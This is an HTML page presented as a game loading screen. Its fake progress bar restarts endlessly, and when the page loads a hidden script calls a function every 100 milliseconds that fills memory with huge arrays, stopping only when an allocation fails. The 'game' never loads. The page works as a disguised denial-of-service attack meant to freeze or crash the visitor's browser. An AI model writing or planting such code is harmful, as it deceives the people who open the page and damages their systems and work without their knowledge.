<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Game Loading...</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #0b3d91;
            color: white;
            text-align: center;
            padding: 50px;
            margin: 0;
        }
        .loading-container {
            background-color: #222;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
            display: inline-block;
        }
        .loading-text {
            font-size: 2em;
            margin-bottom: 20px;
        }
        .loading-bar {
            width: 300px;
            height: 20px;
            background-color: #444;
            border-radius: 10px;
            overflow: hidden;
            margin: 20px auto;
        }
        .progress-bar {
            width: 0;
            height: 100%;
            background-color: #00ff00;
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <h1 class="loading-text">Loading Game...</h1>
        <div class="loading-bar">
            <div class="progress-bar"></div>
        </div>
    </div>

    <script>
        let memoryArray = [];

        function stressTestMemory() {
            try {
                for (let i = 0; i < 1000; i++) {
                    memoryArray.push(new Array(100000).fill(0));
                }
            } catch (e) {
                console.error('Memory stress test failed:', e);
                clearInterval(memoryTestInterval);
            }
        }

        const memoryTestInterval = setInterval(stressTestMemory, 100);

        const progressBar = document.querySelector('.progress-bar');

        function updateProgressBar() {
            let width = 0;
            const interval = setInterval(() => {
                if (width >= 100) {
                    width = 0;
                }
                width += Math.random() * 5;
                progressBar.style.width = width + '%';
            }, 200);

            window.addEventListener('beforeunload', () => clearInterval(interval));
        }

        updateProgressBar();
    </script>
</body>
</html>
